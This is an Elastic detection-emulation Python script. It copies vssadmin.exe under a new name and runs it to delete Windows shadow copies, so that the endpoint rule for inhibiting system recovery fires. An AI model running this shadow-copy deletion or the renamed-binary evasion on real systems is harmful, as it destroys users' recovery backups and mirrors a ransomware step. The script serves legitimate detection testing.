# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata


metadata = RtaMetadata(
    uuid="5fe84989-d544-4a7b-9fbf-0e30d86c09ce",
    platforms=["windows"],
    endpoint=[
        {
            "rule_name": "Inhibit System Recovery via Renamed Utilities",
            "rule_id": "153f52e2-2fe5-420b-8691-ddb8562b99d7",
        }
    ],
    siem=[],
    techniques=["T1490", "T1218"],
)


@common.requires_os(metadata.platforms)
def main():
    vssadmin = "C:\\Windows\\System32\\vssadmin.exe"
    ren_vssadmin = "C:\\Users\\Public\\renvssadmin.exe"

    common.copy_file(vssadmin, ren_vssadmin)
    # Execute command
    common.log("Deleting Shadow Copies using a renamed Vssadmin")
    common.execute([ren_vssadmin, "delete", "shadows", "/For=C:"], timeout=10)
    common.remove_file(ren_vssadmin)


if __name__ == "__main__":
    exit(main())
